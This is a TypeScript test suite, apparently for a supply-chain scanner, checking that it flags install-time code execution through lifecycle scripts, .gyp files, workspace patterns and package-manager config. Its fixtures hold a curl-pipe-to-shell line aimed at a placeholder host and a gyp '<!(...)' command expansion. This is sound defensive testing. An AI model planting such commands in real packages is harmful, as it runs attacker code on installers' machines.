import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { checkLifecycle } from "../src/checks/lifecycle.js";
import { diffTrees } from "../src/diff.js";
import { run } from "../src/main.js";
import { scanDirectory } from "../src/scan.js";
import type { Tree } from "../src/tree.js";
import { fakeIO, fx, testCtx } from "./helpers.js";

/* What an install runs without a lifecycle script in the diff: dependencies-family scripts, .gyp files, workspaces and local specs. */

const CURL_SH = "curl -s https://a.invalid/x | sh";
const mem = (files: Record<string, string>, label = "mem"): Tree => ({ label, list: () => Object.keys(files), read: (p) => files[p] });

function dir(files: Record<string, string>): string {
  const d = mkdtempSync(join(tmpdir(), "ws-surface-"));
  for (const [p, text] of Object.entries(files)) {
    mkdirSync(dirname(join(d, p)), { recursive: true });
    writeFileSync(join(d, p), text);
  }
  return d;
}

test("scan: the dependencies-family and pnpm:devPreinstall scripts an install runs get the content checks", () => {
  // npm 10.9.2 ran predependencies, dependencies and postdependencies under `npm install` and `npm ci`; pnpm 11.16.0 ran pnpm:devPreinstall.
  for (const hook of ["predependencies", "dependencies", "postdependencies", "pnpm:devPreinstall"]) {
    const text = JSON.stringify({ name: "x", private: true, dependencies: { a: "^1.0.0" }, scripts: { [hook]: CURL_SH } }, null, 2);
    const f = checkLifecycle("package.json", text, testCtx());
    const lc2 = f.find((x) => x.ruleId === "WS-LC-002");
    assert.ok(lc2, hook);
    assert.equal(lc2.severity, "high");
    // The line is the script's, not the top-level "dependencies" map's.
    assert.equal(lc2.line, text.split("\n").findIndex((l) => l.includes(CURL_SH.slice(0, 10))) + 1, hook);
  }
});

test("scan: a .gyp file beside a package.json without install scripts is reported like an install script", () => {
  const ids = (files: Record<string, string>) =>
    // A script's key ends with a hash of its command; which script or .gyp file is reported is what matters here.
    scanDirectory(dir(files), testCtx(), { nodeModules: false }).findings.map((f) => `${f.ruleId} ${f.severity} ${f.file} ${f.key.replace(/:[0-9a-f]{32}$/, "")}`).filter((k) => k.startsWith("WS-LC-001"));
  const gyp = "{ 'targets': [{ 'target_name': 'x', 'sources': ['<!(touch PWNED && echo x.c)'] }] }";
  assert.deepEqual(ids({ "package.json": '{"name":"r","private":true}', "binding.gyp": gyp }), ["WS-LC-001 low package.json gyp"]);
  assert.deepEqual(ids({ "package.json": '{"name":"pub"}', "packages/a/package.json": '{"name":"a"}', "packages/a/Addon.GYP": gyp }), ["WS-LC-001 medium packages/a/package.json gyp"]);
  // npm, pnpm and Yarn 1 run the install script instead.
  assert.deepEqual(ids({ "package.json": JSON.stringify({ name: "r", private: true, scripts: { install: "node build.js" } }), "binding.gyp": gyp }), ["WS-LC-001 low package.json install"]);
  // gypfile: false stops npm only: pnpm 11.16.0 and Yarn 1.22.22 ran binding.gyp's <!(...) command with it set.
  assert.deepEqual(ids({ "package.json": JSON.stringify({ name: "r", private: true, gypfile: false }), "binding.gyp": gyp }), ["WS-LC-001 low package.json gyp"]);
  assert.deepEqual(ids({ "package.json": JSON.stringify({ name: "r", gypfile: false }), "packages/a/package.json": JSON.stringify({ name: "a", gypfile: false }), "packages/a/Binding.GYP": gyp }), ["WS-LC-001 medium packages/a/package.json gyp"]);
  // A preinstall script stops npm and pnpm, not Yarn 1 (1.22.22 ran binding.gyp with preinstall set).
  assert.deepEqual(ids({ "package.json": JSON.stringify({ name: "r", private: true, scripts: { preinstall: "echo hi" } }), "binding.gyp": gyp }), ["WS-LC-001 low package.json preinstall", "WS-LC-001 low package.json gyp"]);
  // An empty install script is no script: npm 10.9.2 ran binding.gyp with "install": "".
  assert.deepEqual(ids({ "package.json": JSON.stringify({ name: "r", private: true, scripts: { install: "" } }), "binding.gyp": gyp }), ["WS-LC-001 low package.json install", "WS-LC-001 low package.json gyp"]);
  // Positive control: npm alone reads other *.gyp names, and gypfile: false stops it.
  assert.deepEqual(ids({ "package.json": JSON.stringify({ name: "r", private: true, gypfile: false }), "addon.gyp": gyp }), []);
  assert.deepEqual(ids({ "package.json": JSON.stringify({ name: "r", private: true, scripts: { install: "" } }), "addon.gyp": gyp }), ["WS-LC-001 low package.json install", "WS-LC-001 low package.json gyp"]);
  const msg = (files: Record<string, string>) => scanDirectory(dir(files), testCtx(), { nodeModules: false }).findings.find((f) => f.key === "gyp")?.message;
  assert.equal(
    msg({ "package.json": JSON.stringify({ name: "r", private: true, gypfile: false }), "binding.gyp": gyp }),
    "binding.gyp present: pnpm and Yarn 1 run node-gyp rebuild on install; npm does not, because of gypfile: false, which pnpm and Yarn 1 ignore, and gyp <!(...) expansions run shell commands",
  );
  assert.match(msg({ "package.json": JSON.stringify({ name: "r", private: true, scripts: { preinstall: "x" } }), "binding.gyp": gyp }) ?? "", /: Yarn 1 run node-gyp .*because of the preinstall script, which Yarn 1 ignores,/);
  assert.match(msg({ "package.json": '{"name":"r"}', "binding.gyp": gyp }) ?? "", /^binding\.gyp present: npm, pnpm and Yarn 1 run node-gyp rebuild on install for every consumer of this package, and gyp/);
  assert.deepEqual(ids({ "package.json": '{"name":"r","private":true}', "src/binding.gyp": gyp }), [], "only beside a manifest");
});

test("scan: a workspace pattern that reaches an ignored path, node_modules, .git or outside the repository is WS-SC-900", async () => {
  const baseline = { version: 1, entries: [], ignorePaths: [{ path: "test/fixtures", justification: "Inert fixtures used by the test suite" }] };
  const scan = async (workspaces: unknown) => {
    const d = dir({
      "package.json": JSON.stringify({ name: "r", private: true, workspaces }),
      ".wormsign-baseline.json": JSON.stringify(baseline),
      "test/fixtures/evil/package.json": JSON.stringify({ name: "evil", scripts: { postinstall: CURL_SH } }),
      "packages/a/package.json": '{"name":"a"}',
    });
    const io = fakeIO();
    const code = await run(["scan", d, "--format", "json", "--iocs", fx("iocs")], io);
    return { code, f: (JSON.parse(io.out) as { findings: { ruleId: string; message: string }[] }).findings.filter((x) => x.ruleId === "WS-SC-900") };
  };
  for (const ws of [["test/fixtures/evil"], ["test/*/evil"], ["Test/Fixtures/*"], ["**"], { packages: ["test/fixtures/*"] }, ["vendor/node_modules/x"], ["../elsewhere"]]) {
    const r = await scan(ws);
    assert.equal(r.f.length, 1, JSON.stringify(ws));
    assert.match(r.f[0]?.message ?? "", /workspaces pattern/);
    assert.equal(r.code, 1);
  }
  for (const ws of [["packages/*"], ["test"], ["!test/fixtures/evil"]]) assert.deepEqual((await scan(ws)).f, [], JSON.stringify(ws));
});

test("scan: a pnpm-workspace.yaml packages pattern that reaches an ignored path is WS-SC-900, and an unreadable one fails closed", async () => {
  // pnpm 11.16.0 installed vendor/x from `packages: ["vendor/*"]` and ran its postinstall, with vendor in ignorePaths.
  const baseline = { version: 1, entries: [], ignorePaths: [{ path: "vendor", justification: "Vendored fixtures never installed" }] };
  const scan = async (yaml: string) => {
    const d = dir({
      "package.json": '{"name":"r","private":true}',
      "pnpm-workspace.yaml": yaml,
      ".wormsign-baseline.json": JSON.stringify(baseline),
      "vendor/x/package.json": JSON.stringify({ name: "x", scripts: { postinstall: CURL_SH } }),
      "packages/a/package.json": '{"name":"a"}',
    });
    const io = fakeIO();
    const code = await run(["scan", d, "--format", "json", "--iocs", fx("iocs")], io);
    return { code, f: (JSON.parse(io.out) as { findings: { ruleId: string; message: string }[] }).findings.filter((x) => x.ruleId === "WS-SC-900").map((x) => x.message) };
  };
  for (const yaml of ['packages: ["vendor/*"]\n', "packages:\n  - packages/*\n  - 'vendor/*' # vendored\n", "packages:\n- '**'\n", "packages: [Vendor/X]\n", "packages:\n  - ../elsewhere\n"]) {
    const r = await scan(yaml);
    assert.equal(r.f.length, 1, yaml);
    assert.match(r.f[0] ?? "", /^packages pattern ".*" can match a package .*pnpm runs the install scripts/, yaml);
    assert.equal(r.code, 1, yaml);
  }
  for (const yaml of ["packages:\n  - packages/*\n", "packages: []\n", "packages:\n  - packages/*\n  - '!vendor/*'\n  -\n", "catalog:\n  a: ^1.0.0\npackages: ['packages/*', \"x\"]\n"]) assert.deepEqual((await scan(yaml)).f, [], yaml);
  // A shape the reader does not model is reported as not checked, never read as "no packages".
  for (const yaml of ["packages: &p\n  - vendor/*\n", "packages: [packages/*,\n  vendor/*]\n", "packages: vendor/*\n", "packages:\n  vendor: x\n", "packages:\n  - a\npackages:\n  - vendor/*\n", "packages:\n  - [vendor/*]\n"]) {
    const unread = await scan(yaml);
    assert.equal(unread.f.length, 1, yaml);
    assert.match(unread.f[0] ?? "", /was not checked: .* on line \d+, so wormsign could not read which workspace packages pnpm installs/, yaml);
  }
});

test("diff: an added or changed .gyp file beside a manifest is reported, even under ignorePaths", () => {
  const gyp = "{ 'targets': [{ 'target_name': 'x', 'sources': ['<!(touch PWNED && echo x.c)'] }] }";
  const base = mem({ "package.json": '{"name":"r"}', "fixtures/a/package.json": '{"name":"a"}' });
  const f = (head: Record<string, string>, b = base) => diffTrees(b, mem({ ...base.list().reduce((o, p) => ({ ...o, [p]: base.read(p) }), {}), ...head }), testCtx(), { ignore: ["fixtures"] }).findings.map((x) => `${x.ruleId} ${x.file} ${x.key.split(":").slice(0, 2).join(":")}`);
  assert.deepEqual(f({ "binding.gyp": gyp }), ["WS-DF-002 binding.gyp gyp:added"]);
  assert.deepEqual(f({ "fixtures/a/binding.gyp": gyp }), ["WS-DF-002 fixtures/a/binding.gyp gyp:added"]);
  assert.deepEqual(f({ "src/binding.gyp": gyp }), [], "not beside a manifest");
  const withGyp = mem({ "package.json": '{"name":"r"}', "binding.gyp": "{}" });
  assert.deepEqual(diffTrees(withGyp, mem({ "package.json": '{"name":"r"}', "binding.gyp": gyp }), testCtx()).findings.map((x) => x.key.split(":").slice(0, 2).join(":")), ["gyp:changed"]);
  // Any case, as scan and npm on macOS match it (names are case-folded before matching).
  assert.deepEqual(f({ "Addon.GYP": gyp }), ["WS-DF-002 Addon.GYP gyp:added"]);
});

test("diff: a .gyp file beside a pnpm package.yaml is covered: added is reported, a changed package.yaml fails closed, an unchanged one is quiet", () => {
  const gyp = "{ 'targets': [{ 'target_name': 'x', 'sources': ['<!(touch PWNED && echo x.c)'] }] }";
  const keys = (b: Record<string, string>, h: Record<string, string>) => diffTrees(mem(b), mem(h), testCtx()).findings.filter((x) => x.key.startsWith("gyp:")).map((x) => `${x.file} ${x.key.split(":").slice(0, 2).join(":")}`);
  const yaml = (scripts: string) => ({ "package.json": '{"name":"r"}', "pkg/package.yaml": `name: x\n${scripts}` });
  assert.deepEqual(keys(yaml(""), { ...yaml(""), "pkg/binding.gyp": gyp }), ["pkg/binding.gyp gyp:added"]);
  const withGyp = (scripts: string) => ({ ...yaml(scripts), "pkg/binding.gyp": gyp });
  assert.deepEqual(keys(withGyp("scripts:\n  install: node build.js\n"), withGyp("")), ["pkg/binding.gyp gyp:enabled"], "package.yaml changed: not parsed, so it fails closed");
  assert.deepEqual(keys(withGyp(""), { ...withGyp(""), "README.md": "x" }), [], "package.yaml unchanged: nothing turned on");
});

test("diff: a manifest change that makes npm, pnpm or Yarn 1 run node-gyp on an unchanged .gyp file is reported", () => {
  const gyp = "{ 'targets': [{ 'target_name': 'x', 'sources': ['<!(touch PWNED && echo x.c)'] }] }";
  const root = { "package.json": JSON.stringify({ name: "r", workspaces: ["packages/*"] }) };
  const gypOf = (key: string) => key.split(":").slice(0, 2).join(":");
  const f = (before: Record<string, string>, after: Record<string, string>) =>
    diffTrees(mem({ ...root, ...before }), mem({ ...root, ...after }), testCtx()).findings.filter((x) => x.key.startsWith("gyp:")).map((x) => `${x.ruleId} ${x.file} ${gypOf(x.key)}`);
  const at = (manifest?: object): Record<string, string> => ({ "packages/x/binding.gyp": gyp, ...(manifest ? { "packages/x/package.json": JSON.stringify({ name: "x", version: "1.0.0", ...manifest }) } : {}) });
  const reported = ["WS-DF-002 packages/x/binding.gyp gyp:enabled"];
  // The .gyp file came first, with no manifest beside it; the change adds only the manifest. npm 10.9.2 then ran the gyp command.
  assert.deepEqual(f(at(), at({})), reported, "manifest added beside an existing .gyp file");
  assert.deepEqual(f(at({ gypfile: false }), at({})), reported, "gypfile: false removed");
  assert.deepEqual(f(at({ scripts: { install: "node build.js" } }), at({ scripts: { test: "x" } })), reported, "install script removed");
  assert.deepEqual(f(at({ scripts: { preinstall: "node build.js" } }), at({})), reported, "preinstall script removed");
  assert.deepEqual(f(at(), { ...at(), "packages/x/package.json": "{not json" }).length, 1, "an unreadable manifest counts as running node-gyp");
  // Positive controls: nothing that turns node-gyp on, nothing reported.
  assert.deepEqual(f(at({}), at({ description: "x" })), [], "manifest changed, node-gyp already ran");
  // pnpm 11.16.0 ignores gypfile: with `packages: [.]` it ran the <!(...) command from a manifest that set it.
  assert.deepEqual(f(at(), at({ gypfile: false })), reported, "manifest added with gypfile: false");
  assert.deepEqual(f(at({ gypfile: false, scripts: { install: "echo ok" } }), at({ gypfile: false })), reported, "install script removed, gypfile: false kept");
  assert.deepEqual(f(at({ scripts: { install: "node build.js" } }), at({ scripts: { install: "" } })), reported, "install script emptied");
  assert.deepEqual(f(at({ scripts: { install: "a", preinstall: "b" } }), at({ scripts: { preinstall: "b" } })), reported, "install script removed, preinstall kept (Yarn 1)");
  assert.deepEqual(f(at(), at({ scripts: { install: "node build.js" } })).length, 0, "manifest added with an install script");
  assert.deepEqual(f(at({ scripts: { install: "a" } }), at({ scripts: { install: "b" } })), [], "install script kept");
  const enabled = (before: Record<string, string>, after: Record<string, string>) => diffTrees(mem({ ...root, ...before }), mem({ ...root, ...after }), testCtx()).findings.find((x) => x.key.startsWith("gyp:enabled"))?.message ?? "";
  assert.match(enabled(at(), at({ gypfile: false })), /so that pnpm and Yarn 1 now run node-gyp rebuild on it at install/);
  assert.match(enabled(at({ gypfile: false }), at({})), /so that npm now runs node-gyp rebuild on it at install/);
  // npm alone reads other *.gyp names, and gypfile: false stops it.
  const addon = (manifest: object): Record<string, string> => ({ "packages/x/addon.gyp": gyp, "packages/x/package.json": JSON.stringify({ name: "x", ...manifest }) });
  assert.deepEqual(f({ "packages/x/addon.gyp": gyp }, addon({ gypfile: false })), [], "addon.gyp, manifest added with gypfile: false");
  assert.deepEqual(f(addon({ gypfile: false }), addon({})), ["WS-DF-002 packages/x/addon.gyp gyp:enabled"], "addon.gyp, gypfile: false removed");
  assert.deepEqual(f({ "packages/x/binding.gyp": gyp, "packages/y/package.json": "{}" }, { "packages/x/binding.gyp": gyp, "packages/y/package.json": '{"name":"y"}' }), [], "a manifest in another directory");
  // A .gyp file both added and enabled is reported once, as added.
  assert.deepEqual(f({}, at({})), ["WS-DF-002 packages/x/binding.gyp gyp:added"]);
});

test("diff: through git, a commit that adds only a package.json beside an existing .gyp file is reported, gypfile: false included", async () => {
  const gyp = "{ 'targets': [{ 'target_name': 'x', 'sources': ['<!(touch PWNED && echo x.c)'] }] }";
  const d = repo({ "package.json": '{"name":"r","workspaces":["packages/*"]}', "packages/x/binding.gyp": gyp }, { "packages/x/package.json": '{"name":"x","version":"1.0.0"}' });
  const io = fakeIO();
  const code = await run(["diff", "HEAD~1", "HEAD", "--dir", d, "--format", "json", "--iocs", fx("iocs")], io);
  const findings = (JSON.parse(io.out) as { findings: { ruleId: string; file: string }[] }).findings;
  assert.deepEqual(findings.filter((x) => x.ruleId === "WS-DF-002").map((x) => x.file), ["packages/x/binding.gyp"]);
  assert.equal(code, 0, "medium, below the default --fail-on high");
  // pnpm 11.16.0 ran the <!(...) command from this commit: it does not read gypfile.
  const p = repo({ "pnpm-workspace.yaml": "packages: [.]\n", "binding.gyp": gyp }, { "package.json": '{"name":"proj","version":"1.0.0","private":true,"gypfile":false}' });
  const pio = fakeIO();
  await run(["diff", "HEAD~1", "HEAD", "--dir", p, "--format", "json", "--iocs", fx("iocs")], pio);
  assert.deepEqual((JSON.parse(pio.out) as { findings: { ruleId: string; file: string }[] }).findings.filter((x) => x.ruleId === "WS-DF-002").map((x) => x.file), ["binding.gyp"]);
});

/** A git repository with one commit per entry. */
function repo(...commits: Record<string, string>[]): string {
  const d = mkdtempSync(join(tmpdir(), "ws-surface-git-"));
  const git = (...a: string[]) => execFileSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", "-c", "commit.gpgsign=false", ...a], { cwd: d, stdio: "pipe" });
  git("init", "-q", "-b", "main");
  for (const [i, files] of commits.entries()) {
    for (const [p, text] of Object.entries(files)) {
      mkdirSync(dirname(join(d, p)), { recursive: true });
      writeFileSync(join(d, p), text);
    }
    git("add", "-A");
    git("commit", "-q", "-m", `c${i}`);
  }
  return d;
}

async function diffHigh(d: string): Promise<{ code: number; f: string[] }> {
  const io = fakeIO();
  const code = await run(["diff", "HEAD~1", "HEAD", "--dir", d, "--format", "json", "--iocs", fx("iocs")], io);
  const findings = (JSON.parse(io.out) as { findings: { ruleId: string; severity: string; key: string }[] }).findings;
  return { code, f: findings.filter((x) => x.severity === "high").map((x) => `${x.ruleId} ${x.key.split(":")[0]}`).sort() };
}

const MAL = { "fixtures/mal/package.json": JSON.stringify({ name: "mal", version: "1.0.0", scripts: { preinstall: "touch PWNED" } }) };
const lock = (packages: object) => JSON.stringify({ name: "r", version: "1.0.0", lockfileVersion: 3, requires: true, packages: { "": { name: "r", version: "1.0.0" }, ...packages } });

test("diff: a change that makes npm ci run an unchanged package's install scripts is a high finding", async () => {
  // The lockfile npm 10.9.2 writes for workspaces ["fixtures/mal"]; npm ci then runs the preinstall.
  const ws = repo(
    { "package.json": '{"name":"r","version":"1.0.0"}', "package-lock.json": lock({}), ...MAL },
    {
      "package.json": '{"name":"r","version":"1.0.0","workspaces":["fixtures/mal"]}',
      "package-lock.json": lock({ "fixtures/mal": { version: "1.0.0", hasInstallScript: true }, "node_modules/mal": { resolved: "fixtures/mal", link: true } }),
    },
  );
  const r = await diffHigh(ws);
  assert.deepEqual(r.f, ["WS-DF-001 local", "WS-DF-005 workspaces"]);
  assert.equal(r.code, 1);
  // The same through a file: dependency, in a format that records no install scripts (only the manifest shows it).
  const file = repo(
    { "package.json": '{"name":"r","version":"1.0.0"}', ...MAL },
    { "package.json": '{"name":"r","version":"1.0.0","devDependencies":{"mal":"file:fixtures/mal"}}' },
  );
  assert.deepEqual((await diffHigh(file)).f, ["WS-DF-005 local-spec"]);
  for (const spec of ["./fixtures/mal", "link:fixtures/mal", "portal:fixtures/mal"]) {
    const r2 = await diffHigh(repo({ "package.json": '{"name":"r"}', ...MAL }, { "package.json": JSON.stringify({ name: "r", dependencies: { mal: spec } }) }));
    assert.deepEqual(r2.f, ["WS-DF-005 local-spec"], spec);
  }
  // Unchanged workspaces and specs, or a registry spec, are not reported.
  const same = { "package.json": JSON.stringify({ name: "r", workspaces: ["fixtures/mal"], dependencies: { mal: "file:fixtures/mal", a: "^1.0.0" } }), ...MAL };
  assert.deepEqual((await diffHigh(repo(same, { ...same, "README.md": "x" }))).f, []);
});

test("diff: config naming code in a spelling Yarn 4.10.3 reads is followed; a spelling outside the reader fails closed", () => {
  const yarnrc = (text: string) => ({ ".yarnrc.yml": text });
  const changed = (text: string) => diffTrees(mem({ ...yarnrc(text), "tools/y.cjs": "a", "tools/z.cjs": "a" }), mem({ ...yarnrc(text), "tools/y.cjs": "b", "tools/z.cjs": "b" }), testCtx()).findings.map((x) => `${x.ruleId} ${x.file}`).sort();
  for (const spelling of ['"yarnPath": tools/y.cjs', "'yarnPath': tools/y.cjs", "yarnPath : tools/y.cjs", 'yarnPath: "tools/y.cjs"']) {
    assert.deepEqual(changed(`${spelling}\nplugins:\n  - path: tools/z.cjs\n    spec: "@acme/z"\n`), ["WS-DF-005 tools/y.cjs", "WS-DF-005 tools/z.cjs"], spelling);
  }
  assert.deepEqual(changed("injectEnvironmentFiles: [tools/y.cjs, 'tools/z.cjs?']\n"), ["WS-DF-005 tools/y.cjs", "WS-DF-005 tools/z.cjs"]);
  // Anything the reader does not model is reported on the config itself, every run, keyed on its text.
  for (const text of ["yarnPath: &a tools/y.cjs\n", "yarnPath: tools/y.cjs\nyarnPath: tools/z.cjs\n", 'yarnPath: "tools/\\x79.cjs"\n', "plugins:\n  - {path: tools/z.cjs}\n"]) {
    assert.ok(changed(text).includes("WS-DF-006 .yarnrc.yml"), text);
  }
  const pnpm = diffTrees(mem({ "pnpm-workspace.yaml": "'pnpmfile' : hooks/p.cjs\n", "hooks/p.cjs": "a" }), mem({ "pnpm-workspace.yaml": "'pnpmfile' : hooks/p.cjs\n", "hooks/p.cjs": "b" }), testCtx());
  assert.deepEqual(pnpm.findings.map((x) => `${x.ruleId} ${x.file}`), ["WS-DF-005 hooks/p.cjs"]);
});

test("diff: a change that adds or edits an editor or agent auto-run file is checked like scan checks it; ignored paths stay ignored", () => {
  const task = (cmd: string) => JSON.stringify({ version: "2.0.0", tasks: [{ label: "t", command: cmd, runOptions: { runOn: "folderOpen" } }] });
  const base = mem({ "package.json": '{"name":"r"}' });
  const head = (files: Record<string, string>) => mem({ "package.json": '{"name":"r"}', ...files });
  const found = (h: Tree, ignore: string[] = []) => diffTrees(base, h, testCtx(), { ignore }).findings.map((x) => `${x.ruleId} ${x.severity} ${x.file}`);
  assert.deepEqual(found(head({ ".vscode/tasks.json": task("node .claude/setup.mjs") })), ["WS-PS-001 high .vscode/tasks.json"]);
  assert.deepEqual(found(head({ ".claude/settings.json": JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: "command", command: "node x.js" }] }] } }) })), ["WS-PS-002 high .claude/settings.json"]);
  assert.deepEqual(found(head({ "fixtures/.vscode/tasks.json": task("x") }), ["fixtures"]), [], "an ignored fixture directory is not a folder anyone opens");
  const same = head({ ".vscode/tasks.json": task("tsc -w") });
  assert.deepEqual(diffTrees(same, same, testCtx()).findings, [], "an unchanged file is not reported again");
});
